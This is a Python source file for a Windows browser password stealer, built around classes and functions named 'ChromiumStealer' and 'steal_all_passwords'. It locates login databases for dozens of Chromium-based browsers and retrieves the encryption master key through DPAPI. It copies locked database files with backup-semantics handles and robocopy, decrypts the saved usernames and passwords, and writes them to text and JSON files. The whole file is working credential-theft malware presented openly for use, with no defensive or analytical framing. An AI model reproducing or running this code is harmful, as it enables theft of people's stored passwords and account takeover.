import os
import json
import base64
import sqlite3
import shutil
import tempfile
import time
import psutil
from dataclasses import dataclass
from datetime import datetime
from typing import List, Dict, Tuple

try:
    import win32crypt
    import win32file
    import win32con
    import win32api
    import pywintypes
    WIN32 = True
except ImportError:
    WIN32 = False

try:
    from Crypto.Cipher import AES
    CRYPTO = True
except ImportError:
    CRYPTO = False

@dataclass
class Password:
    url: str
    username: str
    password: str
    browser: str = ""
    profile: str = ""

class ChromiumDecryptor:
    def __init__(self, master_key: bytes):
        self.master_key = master_key
    
    def decrypt(self, ciphertext: bytes) -> str:
        if not ciphertext:
            return ""
        
        if ciphertext.startswith(b'v10') and len(ciphertext) >= 31:
            try:
                iv = ciphertext[3:15]
                encrypted = ciphertext[15:-16]
                
                if CRYPTO and self.master_key:
                    cipher = AES.new(self.master_key, AES.MODE_GCM, iv)
                    decrypted = cipher.decrypt(encrypted)
                    
                    for enc in ['utf-8', 'latin-1', 'cp1252']:
                        try:
                            return decrypted.decode(enc)
                        except:
                            continue
                    return decrypted.hex()
            except:
                pass
        
        try:
            if WIN32:
                decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
                for enc in ['utf-8', 'latin-1', 'cp1252']:
                    try:
                        return decrypted.decode(enc)
                    except:
                        continue
                return decrypted.hex()
        except:
            pass
        
        return "[Decryption failed]"

class BrowserConfig:
    def __init__(self, name: str, browser_type: str, paths: Dict):
        self.name = name
        self.browser_type = browser_type
        self.paths = paths

def is_browser_running(browser_name: str) -> bool:
    # Check if browser process is running 
    process_names = {
        'Chrome': ['chrome.exe'],
        'Edge': ['msedge.exe'],
        'Brave': ['brave.exe'],
        'Opera': ['opera.exe', 'launcher.exe'],
        'Opera GX': ['opera.exe', 'launcher.exe'],
        'Vivaldi': ['vivaldi.exe'],
        'Yandex Browser': ['browser.exe'],
        'Chromium': ['chromium.exe'],
    }
    
    names = process_names.get(browser_name, [f"{browser_name.lower().replace(' ', '')}.exe"])
    
    try:
        for proc in psutil.process_iter(['name', 'pid']):
            if proc.info['name'] and proc.info['name'].lower() in [n.lower() for n in names]:
                return True
    except (psutil.NoSuchProcess, psutil.AccessDenied):
        pass
    return False

def get_browser_configs(enabled_browsers=None):
    configs = []
    appdata = os.environ.get('APPDATA', '')
    localappdata = os.environ.get('LOCALAPPDATA', '')
    
    if enabled_browsers is None:
        enabled_browsers = ['Chrome', 'Edge', 'Brave', 'Opera', 'Opera GX', 'Vivaldi', 
                          'Firefox', 'Yandex Browser', 'Chromium', 'Others']
    
    chromium_browsers = [
        ('Chrome', r'Google\Chrome', False),
        ('Edge', r'Microsoft\Edge', False),
        ('Brave', r'BraveSoftware\Brave-Browser', False),
        ('Opera', r'Opera Software\Opera Stable', True),
        ('Opera GX', r'Opera Software\Opera GX Stable', True),
        ('Vivaldi', r'Vivaldi', False),
        ('Yandex Browser', r'Yandex\YandexBrowser', False),
        ('Chromium', r'Chromium', False),
        ('Epic Privacy Browser', r'Epic Privacy Browser', False),
        ('Iridium', r'Iridium', False),
        ('360 Chrome', r'360Chrome\Chrome', False),
        ('360 Safe Browser', r'360se6\User Data', False),
        ('QQ Browser', r'Tencent\QQBrowser\User Data', False),
        ('Baidu Browser', r'Baidu\BaiduBrowser\User Data', False),
        ('Sogou Explorer', r'SogouExplorer\Webkit', False),
        ('Maxthon', r'Maxthon3\Users', False),
        ('UC Browser', r'UCBrowser\User Data', False),
        ('Liebao', r'Liebao\User Data', False),
        ('CocCoc', r'CocCoc\Browser\User Data', False),
        ('Slimjet', r'Slimjet\User Data', False),
        ('SlimBrowser', r'SlimBrowser\User Data', False),
        ('Torch', r'Torch\User Data', False),
        ('Comodo Dragon', r'Comodo\Dragon\User Data', False),
        ('Comodo IceDragon', r'Comodo\IceDragon\User Data', False),
        ('SRWare Iron', r'SRWare Iron\User Data', False),
        ('Citrio', r'Citrio\User Data', False),
        ('Orbitum', r'Orbitum\User Data', False),
        ('Amigo', r'Amigo\User Data', False),
        ('RockMelt', r'RockMelt\User Data', False),
        ('Flock', r'Flock\Browser\User Data', False),
        ('CoolNovo', r'CoolNovo\User Data', False),
        ('Baidu Spark', r'Baidu Spark\User Data', False),
        ('Tungsten', r'Tungsten\User Data', False),
        ('Mustang', r'Mustang\User Data', False),
        ('QIP Surf', r'QIP Surf\User Data', False),
        ('Coowon', r'Coowon\User Data', False),
        ('Deepnet Explorer', r'Deepnet Explorer\User Data', False),
        ('Staff', r'Staff\User Data', False),
        ('Rambler', r'Rambler\User Data', False),
        ('Nichrome', r'Nichrome\User Data', False),
        ('Titan Browser', r'Titan Browser\User Data', False),
        ('Chedot', r'Chedot\User Data', False),
        ('7Star', r'7Star\7Star\User Data', False),
        ('CentBrowser', r'CentBrowser\User Data', False),
        ('CheBrowser', r'CheBrowser\User Data', False),
        ('Elements Browser', r'Elements Browser\User Data', False),
        ('Superbird', r'Superbird\User Data', False),
        ('Ghost Browser', r'GhostBrowser\User Data', False),
        ('Avast Secure Browser', r'AVAST Software\Browser\User Data', False),
        ('AVG Secure Browser', r'AVG\Browser\User Data', False),
        ('CCleaner Browser', r'CCleaner Browser\User Data', False),
    ]
    
    for name, path, is_opera in chromium_browsers:
        if name not in enabled_browsers and 'Others' not in enabled_browsers:
            if name not in ['Chrome', 'Edge', 'Brave', 'Opera', 'Opera GX', 'Vivaldi', 'Firefox', 'Yandex Browser', 'Chromium']:
                continue
            if name not in enabled_browsers:
                continue
        
        if is_opera:
            local_state = os.path.join(appdata, path, 'Local State')
            user_data = os.path.join(appdata, path)
        else:
            local_state = os.path.join(localappdata, path, 'User Data', 'Local State')
            user_data = os.path.join(localappdata, path, 'User Data')
        
        configs.append(BrowserConfig(name, 'chromium', {
            'local_state': local_state,
            'user_data': user_data
        }))
    
    firefox_browsers = [
        ('Firefox', r'Mozilla\Firefox'),
        ('Firefox Developer', r'Mozilla\Firefox Developer Edition'),
        ('Firefox Nightly', r'Mozilla\Firefox Nightly'),
        ('Firefox ESR', r'Mozilla\Firefox ESR'),
        ('Waterfox', r'Waterfox'),
        ('Pale Moon', r'Moonchild Productions\Pale Moon'),
        ('Basilisk', r'Moonchild Productions\Basilisk'),
        ('SeaMonkey', r'Mozilla\SeaMonkey'),
        ('K-Meleon', r'K-Meleon'),
        ('Thunderbird', r'Mozilla\Thunderbird'),
    ]
    
    for name, path in firefox_browsers:
        if name not in enabled_browsers and 'Others' not in enabled_browsers:
            if name != 'Firefox':
                continue
        
        profile_path = os.path.join(appdata, path, 'Profiles')
        configs.append(BrowserConfig(name, 'firefox', {
            'profile_path': profile_path
        }))
    
    return configs

def copy_locked_file(src: str, dst: str, max_retries: int = 5) -> bool:
    """
    Copy a locked file using multiple methods.
    Returns True if successful, False otherwise.
    """
    # Method 1: Standard copy (works if file not locked)
    try:
        shutil.copy2(src, dst)
        return True
    except (PermissionError, OSError):
        pass
    
    # Method 2: Windows API with proper sharing flags
    if WIN32 and os.name == 'nt':
        try:
            # Open source with maximum sharing permissions
            src_handle = win32file.CreateFile(
                src,
                win32con.GENERIC_READ,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_SHARE_DELETE,
                None,
                win32con.OPEN_EXISTING,
                win32con.FILE_ATTRIBUTE_NORMAL | win32con.FILE_FLAG_BACKUP_SEMANTICS,
                None
            )
            
            # Create destination
            dst_handle = win32file.CreateFile(
                dst,
                win32con.GENERIC_WRITE,
                0,
                None,
                win32con.CREATE_ALWAYS,
                win32con.FILE_ATTRIBUTE_NORMAL,
                None
            )
            
            # Copy in chunks
            while True:
                try:
                    hr, data = win32file.ReadFile(src_handle, 65536)
                    if not data:
                        break
                    win32file.WriteFile(dst_handle, data)
                except pywintypes.error:
                    break
            
            win32file.CloseHandle(src_handle)
            win32file.CloseHandle(dst_handle)
            return True
            
        except Exception:
            pass
    
    # Method 3: VSS Shadow Copy approach using rstrui.exe or vssadmin
    # This requires admin privileges but works even when file is exclusively locked
    if os.name == 'nt':
        try:
            import subprocess
            import uuid
            
            # Create a temporary shadow copy using WMI
            # This is a simplified version - full VSS requires admin and complex COM calls
            volume = os.path.splitdrive(os.path.abspath(src))[0] + "\\"
            
            # Try using robocopy with backup privileges
            result = subprocess.run(
                ['robocopy', os.path.dirname(src), os.path.dirname(dst), 
                 os.path.basename(src), '/B', '/ZB', '/COPY:DAT', '/R:0', '/W:0'],
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0 or result.returncode == 1:  # 1 = files copied successfully
                temp_copied = os.path.join(os.path.dirname(dst), os.path.basename(src))
                if os.path.exists(temp_copied):
                    os.rename(temp_copied, dst)
                    return True
        except Exception:
            pass
    
    # Method 4: Raw disk read (last resort, requires knowing file location on disk)
    # This bypasses file system locks entirely
    if WIN32 and os.name == 'nt':
        try:
            import ctypes
            from ctypes import wintypes
            
            # Try to use NtCreateFile with FILE_OPEN_FOR_BACKUP_INTENT
            ntdll = ctypes.WinDLL('ntdll.dll')
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            # Open file with backup intent using NtCreateFile
            FILE_OPEN_FOR_BACKUP_INTENT = 0x00004000
            FILE_SYNCHRONIZE = 0x00100000
            FILE_READ_DATA = 0x0001
            
            # Fallback to CreateFileW with FILE_FLAG_BACKUP_SEMANTICS and explicit sharing
            handle = kernel32.CreateFileW(
                src,
                0x80000000,  # GENERIC_READ
                0x00000007,  # FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE
                None,
                3,           # OPEN_EXISTING
                0x02000000 | 0x10000000,  # FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_SEQUENTIAL_SCAN
                None
            )
            
            if handle == -1 or handle == 0:
                # Try with just backup semantics and no sharing restrictions on our end
                handle = kernel32.CreateFileW(
                    src,
                    0x80000000,
                    0x00000007,
                    None,
                    3,
                    0x02000000,  # FILE_FLAG_BACKUP_SEMANTICS only
                    None
                )
            
            if handle != -1 and handle != 0:
                try:
                    with open(dst, 'wb') as dst_file:
                        buffer = ctypes.create_string_buffer(262144)  # 256KB buffer
                        bytes_read = wintypes.DWORD()
                        
                        while True:
                            success = kernel32.ReadFile(
                                handle,
                                buffer,
                                262144,
                                ctypes.byref(bytes_read),
                                None
                            )
                            if not success or bytes_read.value == 0:
                                break
                            dst_file.write(buffer.raw[:bytes_read.value])
                    
                    kernel32.CloseHandle(handle)
                    return True
                except:
                    kernel32.CloseHandle(handle)
        except:
            pass
    
    return False

class ChromiumStealer:
    def __init__(self, config: BrowserConfig):
        self.config = config
        self.decryptor = None
        self.temp_db = None
    
    def get_master_key(self) -> bool:
        local_state = self.config.paths.get('local_state')
        if not local_state or not os.path.exists(local_state):
            return False
        
        try:
            with open(local_state, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            encrypted_key = base64.b64decode(data["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            
            if WIN32:
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                self.decryptor = ChromiumDecryptor(master_key)
                return True
        except:
            pass
        
        return False
    
    def find_profiles(self) -> List[Tuple[str, str]]:
        user_data = self.config.paths.get('user_data')
        if not user_data or not os.path.exists(user_data):
            return []
        
        profiles = []
        
        # Look for Default profile
        default_login = os.path.join(user_data, "Default", "Login Data")
        if os.path.exists(default_login):
            profiles.append(("Default", default_login))
        
        # Look for numbered profiles dynamically
        profile_num = 1
        while profile_num <= 20:
            profile_name = f"Profile {profile_num}"
            login_data = os.path.join(user_data, profile_name, "Login Data")
            
            if os.path.exists(login_data):
                profiles.append((profile_name, login_data))
            
            profile_num += 1
        
        # Also check for any directory containing Login Data
        try:
            for item in os.listdir(user_data):
                item_path = os.path.join(user_data, item)
                if os.path.isdir(item_path) and item not in ['System Profile', 'Guest Profile']:
                    login_data = os.path.join(item_path, "Login Data")
                    if os.path.exists(login_data) and (item, login_data) not in profiles:
                        profiles.append((item, login_data))
        except Exception:
            pass
        
        return profiles
    
    def steal(self, output_dir: str) -> List[Password]:
        passwords = []
        
        if not self.get_master_key():
            return passwords
        
        profiles = self.find_profiles()
        if not profiles:
            return passwords
        
        for profile_name, login_db in profiles:
            temp_db = None
            retry_count = 0
            max_retries = 3
            
            while retry_count < max_retries:
                try:
                    # Create temp file in system temp (not output_dir to avoid permission issues)
                    fd, temp_db = tempfile.mkstemp(suffix='.db', prefix=f'{self.config.name.replace(" ", "_")}_')
                    os.close(fd)
                    
                    # Copy using robust locked-file handler
                    if not copy_locked_file(login_db, temp_db):
                        retry_count += 1
                        time.sleep(0.5 * retry_count)
                        if temp_db and os.path.exists(temp_db):
                            try:
                                os.remove(temp_db)
                            except:
                                pass
                        continue
                    
                    # Ensure file is fully written before opening
                    time.sleep(0.1)
                    
                    # Query the copied database with timeout
                    conn = sqlite3.connect(temp_db, timeout=10.0)
                    conn.row_factory = sqlite3.Row
                    cursor = conn.cursor()
                    
                    # Check if table exists first
                    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
                    if not cursor.fetchone():
                        conn.close()
                        break
                    
                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                    
                    for row in cursor.fetchall():
                        url = row['action_url'] or ""
                        username = row['username_value'] or ""
                        encrypted = row['password_value']
                        
                        if encrypted and self.decryptor:
                            password = self.decryptor.decrypt(encrypted)
                        else:
                            password = ""
                        
                        if url or username:
                            passwords.append(Password(
                                url=url,
                                username=username,
                                password=password,
                                browser=self.config.name,
                                profile=profile_name
                            ))
                    
                    conn.close()
                    break  # Success, exit retry loop
                    
                except sqlite3.OperationalError as e:
                    if "database is locked" in str(e).lower() or "disk I/O error" in str(e).lower():
                        retry_count += 1
                        time.sleep(0.5 * retry_count)
                    else:
                        break
                except Exception:
                    break
                finally:
                    if temp_db and os.path.exists(temp_db):
                        try:
                            os.remove(temp_db)
                        except:
                            pass
        
        return passwords

def steal_all_passwords(output_dir: str, enabled_browsers=None) -> List[Password]:
    all_passwords = []
    configs = get_browser_configs(enabled_browsers)
    
    for config in configs:
        try:
            if config.browser_type == 'chromium':
                stealer = ChromiumStealer(config)
                passwords = stealer.steal(output_dir)
                all_passwords.extend(passwords)
        except:
            pass
    
    return all_passwords

def save_passwords(passwords: List[Password], output_dir: str):
    if not passwords:
        return
    
    txt_path = os.path.join(output_dir, "Browser_Passwords.txt")
    with open(txt_path, 'w', encoding='utf-8') as f:
        f.write("="*100 + "\n")
        f.write("EXTRACTED BROWSER PASSWORDS\n")
        f.write("="*100 + "\n\n")
        f.write(f"Extraction time: {datetime.now().isoformat()}\n")
        f.write(f"Total passwords: {len(passwords)}\n\n")
        
        for p in passwords:
            f.write(f"Browser:  {p.browser}\n")
            f.write(f"Profile:  {p.profile}\n")
            f.write(f"URL:      {p.url}\n")
            f.write(f"Username: {p.username}\n")
            f.write(f"Password: {p.password}\n")
            f.write("-"*100 + "\n")
    
    json_path = os.path.join(output_dir, "Browser_Passwords.json")
    data = {
        'timestamp': datetime.now().isoformat(),
        'count': len(passwords),
        'passwords': [
            {
                'browser': p.browser,
                'profile': p.profile,
                'url': p.url,
                'username': p.username,
                'password': p.password
            }
            for p in passwords
        ]
    }
    
    with open(json_path, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=2, ensure_ascii=False)